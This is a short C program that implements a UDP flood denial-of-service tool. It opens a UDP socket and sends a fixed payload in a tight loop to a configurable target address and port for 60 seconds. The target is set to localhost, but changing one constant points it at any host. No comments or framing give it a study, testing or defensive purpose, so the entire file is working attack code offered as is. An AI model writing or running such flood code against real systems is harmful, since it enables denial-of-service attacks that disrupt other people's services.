#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

#define TARGET_IP "127.0.0.1"
#define TARGET_PORT 5000
#define FLOOD_DURATION 60

void udpFlood()
{
    int sockfd;
    struct sockaddr_in target;
    char floodData[] = "FloodPayload";

    // Create socket
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd == -1)
    {
        perror("Failed to create socket");
        return;
    }

    // Prepare target address
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(TARGET_PORT);
    if (inet_aton(TARGET_IP, &target.sin_addr) == 0)
    {
        perror("Invalid IP address");
        close(sockfd);
        return;
    }

    time_t startTime = time(NULL);
    while (time(NULL) - startTime < FLOOD_DURATION)
    {
        sendto(sockfd, floodData, strlen(floodData), 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sockfd);
}

int main()
{
    udpFlood();
    return 0;
}